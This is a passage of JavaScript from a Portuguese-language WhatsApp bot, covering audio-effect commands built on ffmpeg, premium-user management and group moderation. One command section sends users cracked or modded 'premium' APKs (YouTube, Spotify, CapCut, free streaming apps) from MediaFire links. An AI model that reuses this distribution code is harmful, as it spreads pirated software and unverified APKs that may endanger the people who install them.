pl.sendMessage(from, {audio: hah, mimetype: 'audio/mp4', ptt:true}, {quoted: selo})
fs.unlinkSync(ran)
})
break

case 'deep':
if (!isQuotedAudio) return reply('Marque um √°udio')
reply(enviar.espere)
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -af "atempo=4/4,asetrate=44500*2/3" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(gem)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
pl.sendMessage(from, {audio: hah, mimetype: 'audio/mp4', ptt:true}, {quoted: selo})
fs.unlinkSync(ran)
})
break

case 'vozmenino':  
if (!isQuotedAudio) return reply('Marque um √°udio')
reply(enviar.espere)
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -filter:a atempo=1.06,asetrate=44100*1.25 ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(gem)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
pl.sendMessage(from, {audio: hah, mimetype: 'audio/mp4', ptt:true}, {quoted: selo})
fs.unlinkSync(ran)
})
break  

case 'grave':
if (!isQuotedAudio) return reply('Marque um √°udio')
reply(enviar.espere)
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -filter:a "atempo=0.9,asetrate=44100" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(gem)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
pl.sendMessage(from, {audio: hah, mimetype: 'audio/mp4', ptt:true}, {quoted: selo})
fs.unlinkSync(ran)
})
break

case 'grave2':
if (!isQuotedAudio) return reply('Marque um √°udio')
reply(enviar.espere)
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -filter:a "atempo=1.6,asetrate=22100" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(gem)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
pl.sendMessage(from, {audio: hah, mimetype: 'audio/mp4', ptt:true}, {quoted: selo})
fs.unlinkSync(ran)
})
break

case 'bass': 
if (!isQuotedAudio) return reply('Marque um √°udio')
reply(enviar.espere)
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -af equalizer=f=20:width_type=o:width=2:g=15 ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(gem)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
pl.sendMessage(from, {audio: hah, mimetype: 'audio/mp4', ptt:true}, {quoted: selo})
fs.unlinkSync(ran)
})
break

case 'bass2': 
if (!isQuotedAudio) return reply('Marque um √°udio')
reply(enviar.espere)
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -af equalizer=f=94:width_type=o:width=2:g=30 ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(gem)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
pl.sendMessage(from, {audio: hah, mimetype: 'audio/mp4', ptt:true}, {quoted: selo})
fs.unlinkSync(ran)
})
break

case 'bass3':
if (!isQuotedAudio) return reply('Marque um √°udio')
reply(enviar.espere)
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -af equalizer=f=20:width_type=o:width=2:g=15 ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(gem)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
pl.sendMessage(from, {audio: hah, mimetype: 'audio/mp4', ptt:true}, {quoted: selo})
fs.unlinkSync(ran)
})
break

case 'estourar':
if (!isQuotedAudio) return reply('Marque um √°udio')
reply(enviar.espere)
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -af "volume=12'" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(gem)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
pl.sendMessage(from, {audio: hah, mimetype: 'audio/mp4', ptt:true}, {quoted: selo})
fs.unlinkSync(ran)
})
break

case 'estourar2':
if (!isQuotedAudio) return reply('Marque um √°udio')
reply(enviar.espere)
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -af "acrusher=.1:1:64:0:log" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(gem)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
pl.sendMessage(from, {audio: hah, mimetype: 'audio/mp4', ptt:true}, {quoted: selo})
fs.unlinkSync(ran)
})
break

//=========(FIM-ALTERAR-AUDIO)===========\\


//========(APPS E JOGOS AQUI)=======\\

case 'lista-app':
botaoale = [
{title: "SELECIONE UM DA LISTA",
rows: [
        {title: "[ü©∏] ùêñùêáùêìùêí ùêàùêåùêîùêçùêÑ [ü©∏]", rowId: `${prefix}imunes`, description: "ùô∞ùöîùöäùöñùöé ùöãùöòùöù"},
	    {title: "[ü©∏] ùêòùêéùêîùêìùêîùêÅùêÑ ùêèùêëùêÑùêåùêàùêîùêå [ü©∏]", rowId: `${prefix}youtube1`, description: "ùô∞ùöîùöäùöñùöé ùöãùöòùöù"},
	    {title: "[ü©∏] ùêíùêèùêéùêìùêàùêÖùêò ùêèùêëùêÑùêåùêàùêîùêå [ü©∏]", rowId: `${prefix}spotify1`, description: "ùô∞ùöîùöäùöñùöé ùöãùöòùöù"},
	    {title: "[ü©∏] ùêíùêçùêÄùêèùêìùêîùêÅùêÑ ùêèùêëùêÑùêåùêàùêîùêå [ü©∏]", rowId: `${prefix}snaptube1`, description: "ùô∞ùöîùöäùöñùöé ùöãùöòùöù"},
	    {title: "[ü©∏] ùêåùêì ùêåùêÄùêçùêÄùêÜùêÑùêë ùêèùêëùêÑùêåùêàùêîùêå [ü©∏]", rowId: `${prefix}manager1`, description: "ùô∞ùöîùöäùöñùöé ùöãùöòùöù"},
	    {title: "[ü©∏] ùêàùêçùêíùêìùêÄùêèùêëùêé ùêïùüó.ùüìùüì [ü©∏]", rowId: `${prefix}instapro1`, description: "ùô∞ùöîùöäùöñùöé ùöãùöòùöù"},
	    {title: "[ü©∏] ùêèùêí ùêìùêéùêîùêÇùêá ùêèùêãùêîùêí [ü©∏]", rowId: `${prefix}pstouch1`, description: "ùô∞ùöîùöäùöñùöé ùöãùöòùöù"},
	    {title: "[ü©∏] ùêÇùêÄùêèùêÇùêîùêì ùêèùêëùêÑùêåùêàùêîùêå [ü©∏]", rowId: `${prefix}capcut1`, description: "ùô∞ùöîùöäùöñùöé ùöãùöòùöù"},
	    {title: "[ü©∏] ùêèùêàùêÇùêíùêÄùêëùêì ùêèùêëùêÑùêåùêàùêîùêå [ü©∏]", rowId: `${prefix}picsart1`, description: "ùô∞ùöîùöäùöñùöé ùöãùöòùöù"},
	    {title: "[ü©∏] ùêìùêÑùêëùêåùêîùêó ùüé.ùüèùüèùüó.ùüè [ü©∏]", rowId: `${prefix}termux1`, description: "ùô∞ùöîùöäùöñùöé ùöãùöòùöù"},
	    {title: "[ü©∏] ùêçùêÑùêìùêÖùêãùêàùêó ùêÉùêÑ ùêèùêéùêÅùêëùêÑ [ü©∏]", rowId: `${prefix}netflix1`, description: "ùô∞ùöîùöäùöñùöé ùöãùöòùöù"},
	    {title: "[ü©∏] ùêêùêîùêàùêÇùêäùêÑùêÉùêàùêì ùêÑùêÉùêàùêìùêéùêë ùêèùêëùêé [ü©∏]", rowId: `${prefix}quickedit1`, description: "ùô∞ùöîùöäùöñùöé ùöãùöòùöù"}]
}]
sendlistA(from, ` [ü©∏] CARRINHO DE APPS [ü©∏]`, ` ${NomeDoBot} `, "", "[ü©∏] ùêãùêàùêíùêìùêÄ ùêÉùêÑ ùêÄùêèùêèùêí [ü©∏]", botaoale)
break

case 'imunes':
bla = `
‚ï≠‚îÄ‚ïº‚îÅ‚ïê‚ïê‚îÅ‚îÅ‚â∫ü©∏‚âª‚îÅ‚îÅ‚ïê‚ïê‚îÅ‚ïæ‚îÄ‚ïÆ
   ùêûùê¨ùêúùê®ùê•ùê°ùêö ùêÆùê¶ùêö ùêùùêöùê¨ ùê®ùê©ùêúÃßùêöÃÉùê®
   ùê™ùêÆùêû ùêùùêûùê¨ùêûùê£ùêö ùêõùêöùê¢ùê±ùêöùê´...

   ùë∫ùíêùíçùíäùíÑùíäùíïùíêùíñ ùíê ùíÑùíêùíéùíÇùíèùíÖùíê: ${pushname}

   ùëÆùíìùíñùíëùíê: ${groupName}
‚ï∞‚îÄ‚ïº‚îÅ‚ïê‚ïê‚îÅ‚îÅ‚â∫ü©∏‚âª‚îÅ‚îÅ‚ïê‚ïê‚îÅ‚ïæ‚îÄ‚ïØ      
`
sendBimg(from, `${logo}`, bla, ` ${NomeDoBot} `, [
{buttonId: `${prefix}imune1`, buttonText: {displayText: `[ü©∏] ùêèùêëùêàùêåùêÄÃÅùêëùêàùêé [ü©∏]`}, type: 1}, {buttonId: `${prefix}imune2`, buttonText: {displayText:`[ü©∏] ùêíùêÑùêÇùêîùêçùêÉùêÄÃÅùêëùêàùêé [ü©∏]`}, type: 1}], selo) 
break


case 'imune1':
pl.sendMessage(from, { react: { text: `‚è≥`, key: m.key }})
reply(`ENVIANDO AESTHETIC WA (AZUL) PRIM√ÅRIO..`)
try {
bla = await mediafire(`https://www.mediafire.com/file/561x7v7dtjuz9mr/AESTHETIC+WA+2+(AZUL)+PRIM√ÅRIO.apk/file'`)
pl.sendMessage(from, {document: {url: bla[0].link}, mimetype: `application/${bla[0].mime}`, fileName: `${bla[0].nome}`}, {quoted: selo}).catch(e => {
reply('ERROR')
})
} catch (e) {
if(String(e).includes("invalid json response body at")) {
console.log("A api caiu ou n√£o foi possivel executar esta a√ß√£o., espere retornar")   
} else {
reply('ERROR!!')
}
}
break


case 'imune2':
pl.sendMessage(from, { react: { text: `‚è≥`, key: m.key }})
reply(`ENVIANDO AESTHETIC WA (ROSA) SECUND√ÅRIO..`)
try {
bla = await mediafire(`https://www.mediafire.com/file/5sq6vqywh0w3zp2/AESTHETIC+WA+2+(ROSA)+SECUND√ÅRIO.apk/file'`)
pl.sendMessage(from, {document: {url: bla[0].link}, mimetype: `application/${bla[0].mime}`, fileName: `${bla[0].nome}`}, {quoted: selo}).catch(e => {
reply('ERROR')
})
} catch (e) {
if(String(e).includes("invalid json response body at")) {
console.log("A api caiu ou n√£o foi possivel executar esta a√ß√£o., espere retornar")   
} else {
reply('ERROR!!')
}
}
break


case 'youtube1':
pl.sendMessage(from, { react: { text: `‚è≥`, key: m.key }})
reply(`ENVIANDO YOUTUBE PREMIUM 15.43.32..`)
try {
bla = await mediafire(`https://www.mediafire.com/file/gi2w88h7nnkyn4w/YouTube_Premium_15.43.32.apk/file'`)
pl.sendMessage(from, {document: {url: bla[0].link}, mimetype: `application/${bla[0].mime}`, fileName: `${bla[0].nome}`}, {quoted: selo}).catch(e => {
reply('ERROR')
})
} catch (e) {
if(String(e).includes("invalid json response body at")) {
console.log("A api caiu ou n√£o foi possivel executar esta a√ß√£o., espere retornar")   
} else {
reply('ERROR!!')
}
}
break


case 'spotify1':
pl.sendMessage(from, { react: { text: `‚è≥`, key: m.key }})
reply(`ENVIANDO SPOTIFY PREMIUM..`)
try {
bla = await mediafire(`https://www.mediafire.com/file/mn8mfzpjt7hk5y1/SPOTIFY_PREMIUM_COM_M%25C3%259ASICAS_OFFLINE.apk/file'`)
pl.sendMessage(from, {document: {url: bla[0].link}, mimetype: `application/${bla[0].mime}`, fileName: `${bla[0].nome}`}, {quoted: selo}).catch(e => {
reply('ERROR')
})
} catch (e) {
if(String(e).includes("invalid json response body at")) {
console.log("A api caiu ou n√£o foi possivel executar esta a√ß√£o., espere retornar")   
} else {
reply('ERROR!!')
}
}
break


case 'snaptube1':
pl.sendMessage(from, { react: { text: `‚è≥`, key: m.key }})
reply(`ENVIANDO SNAPTUBE PREMIUM..`)
try {
bla = await mediafire(`https://www.mediafire.com/file/a8yaml3c5a7euyw/Snaptube_Premium_BY_FlashStudio.apk/file'`)
pl.sendMessage(from, {document: {url: bla[0].link}, mimetype: `application/${bla[0].mime}`, fileName: `${bla[0].nome}`}, {quoted: selo}).catch(e => {
reply('ERROR')
})
} catch (e) {
if(String(e).includes("invalid json response body at")) {
console.log("A api caiu ou n√£o foi possivel executar esta a√ß√£o., espere retornar")   
} else {
reply('ERROR!!')
}
}
break


case 'manager1':
pl.sendMessage(from, { react: { text: `‚è≥`, key: m.key }})
reply(`ENVIANDO MT MANAGER PREMIUM..`)
try {
bla = await mediafire(`https://www.mediafire.com/file/u75a8q2zrqchyi9/MT_2.10.4_-_Raid_J%25C3%25BAnior.apk/file'`)
pl.sendMessage(from, {document: {url: bla[0].link}, mimetype: `application/${bla[0].mime}`, fileName: `${bla[0].nome}`}, {quoted: selo}).catch(e => {
reply('ERROR')
})
} catch (e) {
if(String(e).includes("invalid json response body at")) {
console.log("A api caiu ou n√£o foi possivel executar esta a√ß√£o., espere retornar")   
} else {
reply('ERROR!!')
}
}
break


case 'termux1':
pl.sendMessage(from, { react: { text: `‚è≥`, key: m.key }})
reply(`ENVIANDO TERMUX 0.119.1..`)
try {
bla = await mediafire(`https://www.mediafire.com/file/5leeblndbkdldyd/Termux_0.119.1_apkcombo.com.apk/file'`)
pl.sendMessage(from, {document: {url: bla[0].link}, mimetype: `application/${bla[0].mime}`, fileName: `${bla[0].nome}`}, {quoted: selo}).catch(e => {
reply('ERROR')
})
} catch (e) {
if(String(e).includes("invalid json response body at")) {
console.log("A api caiu ou n√£o foi possivel executar esta a√ß√£o., espere retornar")   
} else {
reply('ERROR!!')
}
}
break


case 'netflix1':
bla = `
‚ï≠‚îÄ‚ïº‚îÅ‚ïê‚ïê‚îÅ‚îÅ‚â∫ü©∏‚âª‚îÅ‚îÅ‚ïê‚ïê‚îÅ‚ïæ‚îÄ‚ïÆ
   ùêûùê¨ùêúùê®ùê•ùê°ùêö ùêÆùê¶ùêö ùêùùêöùê¨ ùê®ùê©ùêúÃßùêöÃÉùê®
   ùê™ùêÆùêû ùêùùêûùê¨ùêûùê£ùêö ùêõùêöùê¢ùê±ùêöùê´...

   ùë∫ùíêùíçùíäùíÑùíäùíïùíêùíñ ùíê ùíÑùíêùíéùíÇùíèùíÖùíê: ${pushname}

   ùëÆùíìùíñùíëùíê: ${groupName}
‚ï∞‚îÄ‚ïº‚îÅ‚ïê‚ïê‚îÅ‚îÅ‚â∫ü©∏‚âª‚îÅ‚îÅ‚ïê‚ïê‚îÅ‚ïæ‚îÄ‚ïØ      
`
sendBimg(from, `${logo}`, bla, ` ${NomeDoBot} `, [
{buttonId: `${prefix}9uhdmax1`, buttonText: {displayText: `[ü©∏] ùüóùêîùêáùêÉùêåùêÄùêó [ü©∏]`}, type: 1}, {buttonId: `${prefix}youcine1`, buttonText: {displayText:`[ü©∏] ùêòùêéùêîùêÇùêàùêçùêÑ [ü©∏]`}, type: 1}], selo) 
break


case 'youcine1':
pl.sendMessage(from, { react: { text: `‚è≥`, key: m.key }})
reply(`ENVIANDO YOUCINE..`)
try {
bla = await mediafire(`https://www.mediafire.com/file/bgd0a715dgk9guu/Youcine-Mobile-youcineapk.com_.apk/file'`)
pl.sendMessage(from, {document: {url: bla[0].link}, mimetype: `application/${bla[0].mime}`, fileName: `${bla[0].nome}`}, {quoted: selo}).catch(e => {
reply('ERROR')
})
} catch (e) {
if(String(e).includes("invalid json response body at")) {
console.log("A api caiu ou n√£o foi possivel executar esta a√ß√£o., espere retornar")   
} else {
reply('ERROR!!')
}
}
break


case '9uhdmax1':
pl.sendMessage(from, { react: { text: `‚è≥`, key: m.key }})
reply(`ENVIANDO 9UHDMAX V7..`)
try {
bla = await mediafire(`https://www.mediafire.com/file/x3nfso1uio6y3ca/9UHDMAX+V7.apk/file'`)
pl.sendMessage(from, {document: {url: bla[0].link}, mimetype: `application/${bla[0].mime}`, fileName: `${bla[0].nome}`}, {quoted: selo}).catch(e => {
reply('ERROR')
})
} catch (e) {
if(String(e).includes("invalid json response body at")) {
console.log("A api caiu ou n√£o foi possivel executar esta a√ß√£o., espere retornar")   
} else {
reply('ERROR!!')
}
}
break


case 'quickedit1':
pl.sendMessage(from, { react: { text: `‚è≥`, key: m.key }})
reply(`ENVIANDO QUICKEDIT EDITOR PRO..`)
try {
bla = await mediafire(`https://www.mediafire.com/file/85zgouc2my226fc/QuickEdit_Text_Editor_Pro.apk/file'`)
pl.sendMessage(from, {document: {url: bla[0].link}, mimetype: `application/${bla[0].mime}`, fileName: `${bla[0].nome}`}, {quoted: selo}).catch(e => {
reply('ERROR')
})
} catch (e) {
if(String(e).includes("invalid json response body at")) {
console.log("A api caiu ou n√£o foi possivel executar esta a√ß√£o., espere retornar")   
} else {
reply('ERROR!!')
}
}
break


case 'pstouch1':
pl.sendMessage(from, { react: { text: `‚è≥`, key: m.key }})
reply(`ENVIANDO PS TOUCH PLUS..`)
try {
bla = await mediafire(`https://www.mediafire.com/file/te3h3gyrvangpne/Ps+touch+Plus.apk/file'`)
pl.sendMessage(from, {document: {url: bla[0].link}, mimetype: `application/${bla[0].mime}`, fileName: `${bla[0].nome}`}, {quoted: selo}).catch(e => {
reply('ERROR')
})
} catch (e) {
if(String(e).includes("invalid json response body at")) {
console.log("A api caiu ou n√£o foi possivel executar esta a√ß√£o., espere retornar")   
} else {
reply('ERROR!!')
}
}
break


case 'instapro1':
pl.sendMessage(from, { react: { text: `‚è≥`, key: m.key }})
reply(`ENVIANDO INSTAPRO V9.55..`)
try {
bla = await mediafire(`https://www.mediafire.com/file/ej5ifnly5z4sgfo/InstaPro_v9.55+Paolla+Zoz+-.apk/file'`)
pl.sendMessage(from, {document: {url: bla[0].link}, mimetype: `application/${bla[0].mime}`, fileName: `${bla[0].nome}`}, {quoted: selo}).catch(e => {
reply('ERROR')
})
} catch (e) {
if(String(e).includes("invalid json response body at")) {
console.log("A api caiu ou n√£o foi possivel executar esta a√ß√£o., espere retornar")   
} else {
reply('ERROR!!')
}
}
break


case 'picsart1':
pl.sendMessage(from, { react: { text: `‚è≥`, key: m.key }})
reply(`ENVIANDO PICSART V20.6.7..`)
try {
bla = await mediafire(`https://www.mediafire.com/file/mqq62r07ksawkuh/v20.6.7.apk/file'`)
pl.sendMessage(from, {document: {url: bla[0].link}, mimetype: `application/${bla[0].mime}`, fileName: `${bla[0].nome}`}, {quoted: selo}).catch(e => {
reply('ERROR')
})
} catch (e) {
if(String(e).includes("invalid json response body at")) {
console.log("A api caiu ou n√£o foi possivel executar esta a√ß√£o., espere retornar")   
} else {
reply('ERROR!!')
}
}
break


case 'capcut1':
pl.sendMessage(from, { react: { text: `‚è≥`, key: m.key }})
reply(`ENVIANDO CAPCUT PREMIUM..`)
try {
bla = await mediafire(`https://www.mediafire.com/file/g0hh0nlhva7rxq2/CapCut-MOD+APK_Premium-6.2.0.apk/file'`)
pl.sendMessage(from, {document: {url: bla[0].link}, mimetype: `application/${bla[0].mime}`, fileName: `${bla[0].nome}`}, {quoted: selo}).catch(e => {
reply('ERROR')
})
} catch (e) {
if(String(e).includes("invalid json response body at")) {
console.log("A api caiu ou n√£o foi possivel executar esta a√ß√£o., espere retornar")   
} else {
reply('ERROR!!')
}
}
break


//========(FINAL DE FUN√á√ïES-PORNO-AQUI)=======\\

case 'serpremium':
case 'serprem':  
if (!SoDono && !m.key.fromMe) return reply(mess.donosmt)
premium.push(`${numerodonoa}@s.whatsapp.net`)
fs.writeFileSync('./fun√ß√µes de cmd/usuarios/premium.json', JSON.stringify(premium))
reply(`Pronto ${numerodonoa} voc√™ foi adicionado na lista premium.`)
break

case 'addpremium':
if (!isGroup) return reply(enviar.msg.grupo)
if (!SoDono && !info.key.fromMe) return reply(enviar.msg.donosmt)
if (info.message.extendedTextMessage === undefined || info.message.extendedTextMessage === null) return 
if (!budy.includes("@55")) {
mentioned = info.message.extendedTextMessage.contextInfo.participant 
bla = premium.includes(mentioned)
if(bla) return reply("*Este n√∫mero j√° est√° incluso..*")  
premium.push(`${mentioned}`)
fs.writeFileSync('./fun√ß√µes de cmd/usuarios/premium.json', JSON.stringify(premium))
pl.sendMessage(from, {text: `üëë@${mentioned.split("@")[0]} foi adicionado √† lista de usu√°rios premium com sucessoüëë`}, {quoted: info})  
} else { 
mentioned = args.join(" ").replace("@", "") + "@s.whatsapp.net"
bla = premium.includes(mentioned)
if(bla) return reply("*Este n√∫mero j√° est√° incluso..*")  
premium.push(`${mentioned}`)
fs.writeFileSync('./fun√ß√µes de cmd/usuarios/premium.json', JSON.stringify(premium))
tedtp = args.join(" ").replace("@", "")
pl.sendMessage(from, {text: `üëë@${tedtp} foi adicionado √† lista de usu√°rios premium com sucessoüëë`, mentions: [mentioned]}, {quoted: selo})
}
break 

case 'delpremium':
if (!isGroup) return reply(enviar.msg.grupo)
if (!SoDono && !info.key.fromMe) return  reply(enviar.msg.donosmt)
if (!budy.includes("@55")) {
num = info.message.extendedTextMessage.contextInfo.participant
bla = premium.includes(num)
if(!bla) return reply("*Este n√∫mero n√£o est√° incluso na lista premium..*")  
pesquisar = num
processo = premium.indexOf(pesquisar)
while(processo >= 0){
premium.splice(processo, 1)
processo = premium.indexOf(pesquisar)
}
fs.writeFileSync('./fun√ß√µes de cmd/usuarios/premium.json', JSON.stringify(premium))
pl.sendMessage(from, {text: ` ${num.split("@")[0]} foi tirado da lista premium com sucesso..`}, {quoted: info})
} else {
mentioned = args.join(" ").replace("@", "") + "@s.whatsapp.net"
bla = premium.includes(mentioned)
if(!bla) return reply("*Este n√∫mero n√£o est√° incluso na lista premium..*")  
pesquisar = mentioned
processo = premium.indexOf(pesquisar)
while(processo >= 0){
premium.splice(processo, 1)
processo = premium.indexOf(pesquisar)
}
fs.writeFileSync('./fun√ß√µes de cmd/usuarios/premium.json', JSON.stringify(premium))
pl.sendMessage(from, {text: ` @${mentioned.split("@")[0]} foi tirado da lista premium com sucesso..`}, {quoted: selo})
}
break

case 'avaliar':
var sections = [
    {
	title: `A·¥†·¥Ä ü…™·¥Ä·¥ÑÃß·¥ÄÃÉ·¥è ${NomeDoBot}`,
	rows: [
	     {title: "‚òÖ‚òÜ‚òÜ‚òÜ‚òÜ", rowId: `${prefix}avaliar2 1`, description: "P√©ssimo üò°"},
	     {title: "‚òÖ‚òÖ‚òÜ‚òÜ‚òÜ", rowId: `${prefix}avaliar2 2`, description: "Ruim üòí"},
	     {title: "‚òÖ‚òÖ‚òÖ‚òÜ‚òÜ", rowId: `${prefix}avaliar2 3`, description: "Regular üòê"},
	     {title: "‚òÖ‚òÖ‚òÖ‚òÖ‚òÜ", rowId: `${prefix}avaliar2 4`, description: "Bom üòä"},
	     {title: "‚òÖ‚òÖ‚òÖ‚òÖ‚òÖ", rowId: `${prefix}avaliar2 5`, description: "Excelente üòÑ"}
		]
    },
   {
	title: "ùó¶ùóúùó¶ùóßùóòùó†ùóîùó¶‚¨áÔ∏è",
	rows: [
         {title: "Contratar", rowId: `${prefix}contratar`, description: "Pol√≠tica De Privacidade"},
	     {title: "Bug ‚õî", rowId: `${prefix}bug`, description: "Informar Sobre Bugs"}
		]
    },
    {
    title: "=================",
    rows: [
   {title: "‚Ü©Ô∏è Voltar ao menu", rowId: `${prefix}menu`}
   ]
   }
]

const evaluation = {
  text: `*S·¥ú·¥Ä A·¥†·¥Ä ü…™·¥Ä·¥ÑÃß·¥ÄÃÉ·¥è S·¥á Ä·¥ÄÃÅ E…¥·¥†…™·¥Ä·¥Ö·¥Ä P·¥Ä Ä·¥Ä O S·¥ú·¥ò·¥è Ä·¥õ·¥á D·¥è B·¥è·¥õ ‚ùó*\n`,
  title: ``,
  footer: `Seu Feedback √â Muito Importante Para Podermos Saber Se Voc√™ Est√° Gostando Da ${NomeDoBot}, Estamos Em Contante Evolu√ß√£o Para Dar O Melhor Bot Para Todos Os Usu√°rios(as)...`,
  buttonText: "ùòºùô´ùôñùô°ùôûùôñùôß ‚òï",
  sections
}


pl.sendMessage(from, evaluation, {quoted: selo})
break

case 'avaliar2':
var nomor = info.participant
tristan = args + ' Estrelas'

teks1 = `„Äå A·¥†·¥Ä ü…™·¥Ä·¥ÑÃß·¥ÄÃÉ·¥è „Äç\n\nUsu√°rio(a): ${pushname}\n\nNumero: wa.me/${sender.split("@s.whatsapp.net")[0]}\n\nChat: ${groupName}\n\nFeedback: ${tristan}`
await pl.sendMessage(`${numerodonoa}@s.whatsapp.net`, {text: teks1}, {quoted: selo})
reply(`Ola ${pushname}, obrigado Por Avaliar! O Seu Feedback √© muito importante para podermos saber se voc√™ est√° gostando da tomioka bot, estaremos melhorando a cada dia! üê±`)
break

case 'premiumlist':
if(!isPremium) return reply(enviar.msg.premium)   
tkks = '‚ï≠‚îÄ‚îÄ‚îÄ‚îÄ*„Äå *PREMIUM USERüëë* „Äç\n'
for (let V of premium) {
tkks += `‚îÇ+  @${V.split('@')[0]}\n`
}
tkks += `‚îÇ+ Total : ${premium.length}\n‚ï∞‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ*„Äå *${NomeDoBot}* „Äç*‚îÄ‚îÄ‚îÄ‚îÄ`
reply(tkks.trim())
break

case 'getquoted':
case 'getinfo':  
case 'get':  
if(!isPremium) return reply(enviar.msg.premium)   
reply(JSON.stringify(info.message.extendedTextMessage.contextInfo, null, 3))
break

case 'id':
case 'figuid':
if (!SoDono && !info.key.fromMe) return 
if (isQuotedSticker) {
var figu = info.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString("base64");
reply(figu)
}
break

case 'bangp':
if (!isGroup) return reply(enviar.msg.grupo)
if (!SoDono && !isCmdy && !isnit && !issupre && !ischyt && !info.key.fromMe) return reply(enviar.msg.donosmt)
if (isBanchat) return reply(`Este grupo ja est√° banido`)
bancht.push(from)
fs.writeFileSync('./fun√ß√µes de cmd/grupos/banchat.json', JSON.stringify(bancht))
reply(`Grupo banido com sucesso`)
break

case 'unbangp':
if (!isGroup) return reply(enviar.msg.grupo)
if (!SoDono && !isCmdy && !isnit && !issupre && !ischyt && !info.key.fromMe) return reply(enviar.msg.donosmt)
let cur = bancht.indexOf(from)
bancht.splice(cur, 1)
fs.writeFileSync('./fun√ß√µes de cmd/grupos/banchat.json', JSON.stringify(bancht))
reply(`Grupo desbanido...`)
break

		case 'block': 
		if (!info.key.fromMe && !SoDono) return reply('Precisa ser Dono')
                if (!info.quoted && !text) return reply(`FORMA ERADA`)
		let users = info.mentionedJid[0] ? info.mentionedJid[0] : info.quoted ? info.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await pl.updateBlockStatus(users, 'block')
		reply(` usu√°rio bloqueado no pv`)
	break
	
        case 'unblock': 
		if (!info.key.fromMe && !SoDono) return reply('Precisa ser Dono')
                if (!info.quoted && !text) return reply(`FORMA ERADA`)
		let userss = info.mentionedJid[0] ? info.mentionedJid[0] : info.quoted ? info.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await pl.updateBlockStatus(userss, 'unblock')
		reply(` usu√°rio desbloqueado no pv`)
	break

case 'autoban':
if (!isGroup) return reply(enviar.msg.adm)
if (!isGroupAdmins && !SoDono) return reply('Precisa ser Dono')
if (args.length < 1) return reply('Hmmmm')
if (Number(args[0]) === 1) {
if(isAdeusCara) return reply("J√° est√° ativado.")
var ind = dbids.indexOf(from)
if(isAdeusCara) {
adeuscara[ind].actived = true
} else {
adeuscara.push({
groupId: from,
actived: true,
number: []
})
}
fs.writeFileSync('./fun√ß√µes de cmd/grupos/adeuscara.json', JSON.stringify(adeuscara, null, 2) + '\n')
reply(`Ativou com sucesso o recurso de autoban neste grupo‚úîÔ∏è`)
} else if (Number(args[0]) === 0) {
if(!isAdeusCara) return reply("J√° est√° Desativado.")  
var ind = dbids.indexOf(from)		
